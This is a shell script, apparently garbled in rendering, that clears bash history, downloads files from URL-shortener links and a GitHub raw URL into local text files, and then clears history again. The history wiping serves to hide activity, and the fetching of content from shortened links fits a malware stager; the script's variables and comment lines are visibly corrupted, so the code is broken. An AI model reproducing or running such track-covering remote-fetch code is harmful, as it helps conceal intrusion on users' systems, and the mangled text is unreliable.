#!/bin/sh
clear

Remove bash history
rm -f ~/.bash_history && history -c && unset HISTFILE
clear

download_success=false
output_file="pro.txt"

Function to try a download using wget or curl
download_file() {
url="1"
    # Try wget first; if not use curl
    if { wget -qO - "url" >> "output_file"; } || { curl -fsSL "url" >> "$output_file"; }; then
download_success=true
clear
fi
}

List of primary URLs for the main file download
primary_urls="https://naturl.link/se19pro https://v.gd/se19pro https://raw.githubusercontent.com/mastercodin/stunning-enigma/refs/heads/main/SE19pro.txt"
clear

Check if either wget or curl is available before trying
if command -v wget > /dev/null 2>&1 || command -v curl > /dev/null 2>&1; then
for url in primary 
u
​
 rls;dodownload 
f
​
 ile"url"
if [ "$download_success" = true ]; then
break
fi
done
else
echo "Neither wget nor curl is installed. Cannot download the main file."
exit 1
fi

if [ "$download_success" = true ]; then
echo "Main download executed successfully!"
else
echo "Looks like there is no internet or the main command failed to execute."
fi

Now download the extra URL separately into a separate file
extra_output_file="pro_extra.txt"
extra_url="https://naturl.link/seprog1"
if command -v wget > /dev/null 2>&1 || command -v curl > /dev/null 2>&1; then
if { wget -qO - "extra 
u
​
 rl">>"extra_output_file"; } || { curl -fsSL "extra 
u
​
 rl">>"extra_output_file"; }; then
echo "Extra download from extra 
u
​
 rlexecutedsuccessfully!"elseecho"Extradownloadfromextra_url failed."
fi
else
echo "Neither wget nor curl is installed. Cannot download the extra file."
fi

clear

Remove command history again for good measure
rm -f ~/.bash_history && history -c && unset HISTFILE
clear
exit

